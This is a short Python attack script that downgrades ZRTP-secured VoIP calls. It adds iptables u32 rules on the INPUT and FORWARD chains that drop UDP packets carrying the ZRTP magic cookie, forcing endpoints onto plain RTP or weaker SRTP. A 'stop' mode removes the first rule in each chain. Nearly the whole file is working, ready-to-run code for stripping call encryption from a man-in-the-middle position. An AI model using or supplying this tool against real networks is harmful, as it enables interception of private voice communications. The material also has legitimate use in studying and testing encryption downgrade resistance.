#!/usr/bin/env python3

import sys
import argparse
import subprocess


parser = argparse.ArgumentParser(
    description="A tool to downgrade ZRTP media stream to RTP, SRTP-SDES or SRTP-DTLS. Its vendor and configuration specific, which protocol will be used after downgrade."
)

parser.add_argument(
    '-m',
    dest="MODE",
    type=str,
    default="run",
    help="Activate \"run\" or deactivate \"stop\" the matching rules. Default is \"run\"" 
)


parser.add_argument(
    '-i',
    dest="INTERFACE",
    type=str,
    help="The interface on which the tool will listen on. If no interface is set, the tool will listen on all interfaces"
)

args = parser.parse_args()



# ZRTP Magic Cookie: "0x5A525450" 
# RFC6189: https://tools.ietf.org/html/rfc6189#section-5

def iptables():

    if args.INTERFACE:
        cmd = f"iptables -I INPUT -i {args.INTERFACE} -m u32 --u32 6&0xFF=0x11&&0>>22&0x3C@12&0xFFFFFFFF=0x5A525450 -j DROP".split()
        subprocess.run(cmd, shell=False)
        cmd = f"iptables -I FORWARD -i {args.INTERFACE} -m u32 --u32 6&0xFF=0x11&&0>>22&0x3C@12&0xFFFFFFFF=0x5A525450 -j DROP".split()
        subprocess.run(cmd, shell=False)

    else:
        cmd = f"iptables -I INPUT -m u32 --u32 6&0xFF=0x11&&0>>22&0x3C@12&0xFFFFFFFF=0x5A525450 -j DROP".split()
        subprocess.run(cmd, shell=False)
        cmd = f"iptables -I FORWARD -m u32 --u32 6&0xFF=0x11&&0>>22&0x3C@12&0xFFFFFFFF=0x5A525450 -j DROP".split()
        subprocess.run(cmd, shell=False)
    
    sys.exit()


if args.MODE == "run":
    print("\033[1;34m[*]\033[0m Add rules for matching ZRTP packets by pattern matching")
    iptables()
elif args.MODE == "stop":
    print("\033[1;34m[*]\033[0m Clear matching rules")
    cmd = "iptables -D INPUT 1".split()
    subprocess.run(cmd, shell=False)
    cmd = "iptables -D FORWARD 1".split()
    subprocess.run(cmd, shell=False)
    sys.exit()
